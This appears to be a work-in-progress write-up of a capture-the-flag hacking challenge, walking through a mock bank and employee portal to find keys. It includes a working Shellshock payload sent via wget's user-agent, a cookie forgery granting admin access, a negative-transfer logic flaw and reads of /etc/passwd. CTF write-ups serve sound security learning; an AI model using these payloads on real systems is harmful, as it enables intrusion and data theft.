# Write-up
Note: try to do it yourself, it is a much more rewarding experience. See this as
a last resort resource.

This is just a WIP, I have only started the CTF.

Update: Annnnnd it looks like the CTF is down now. Unfortunate, I wanted to come back to it. Will leave the repo for archiving purposes.

## 1 - Start
start at:
`http://45.55.54.126/`

want to prove that CEO is embezzling funds.

gives employee portal:
* `104.236.74.251`
* user: `jameson`
* pass: `hunter72`

gives bank interface:
* `104.236.74.251:3000`
* user: `bank`
* pass: `pbeukpbnhovhyixcialnlhpzo`


## 2 - Bank & Employee Portal
### 2.1 - Bank Interface
`http://104.236.74.251:3000/`

turns out it allows negative values:

```
TRANSFER CS -1000.0
(wait 10s)
WITHDRAW 1.0
```

gives URL to scraped accounts:
`http://104.236.74.251:3000/JJJ/all-in-internal-network.txt`

### 2.2 - Employee Portal
starts at: `http://104.236.74.251/`

personal site: `http://104.236.74.251/~dglenn/`

see poems, go up a folder, see files: `http://104.236.74.251/~dglenn/private/`

one of the keys: `http://104.236.74.251/~dglenn/private/key.txt`


also, security notice here: `http://104.236.74.251/mail/isn.html`

it tells us that we want to reach the *new* website (we're currently on the old
one).

it tells us that the new website will be on the internal network (good for us).

it tells us that we'll need 5 keys to access the boss docs.



change cookies so that `accesslevel=2` (`document.cookie="accesslevel=2";`), get
admin.


address of new website: `104.131.92.247`

will need to combine keys here: `http://104.236.74.251/~wscott/keys`

will access the boss dosc here: `http://104.236.74.251/` (user `bdupont`)

## 3 - New Website
`http://104.131.92.247/index.cgi`

Apache & CGI? **SHELLSHOCK**!

`wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/ls" http://104.131.92.247/index.cgi`

[resource](http://security.stackexchange.com/a/68203/44738)

gives us the files:
 * `index.cgi` - has code to trigger Shellshock
 * `index.php` - redirects to `index.cgi`
 * `admin.php` - redirects to `gist.github` and `die()`


`ls` on `/home` (or `cat /etc/passwd`) shows there is a user `jhendricks`

`ls` around (`..`), find file `note`, `cat` it:

`cat secretkey/README`:

```
If you're snooping around in this folder, you're
either Wesley (myself) or an intruder. If the latter
is true, get lost.

----

New security policy means that our keys can be combined
to get Bert's secret. Until the security of these
servers is proven in practice keys should be stored on
the old webserver, here:

http://104.236.74.251/~wscott/secret

Key is protected with a passphrase. The passphrase is
not stored in plaintext for security purposes. Instead
it is hashed with /usr/local/bin/securehash. Of course
secure hash is chosen because it is far more secure than
broken hash functions such as MD5.

Oh, and if you're an intruder: securehash is not related
to NIST's "SHA ('Secure' Hash Algorithm)" which is of
course not secure at all. securehash is my own invention
and nobody has broken it at all yet, so you can leave now.

Hash: 84c355da8831b62075d2ad9133ce6512
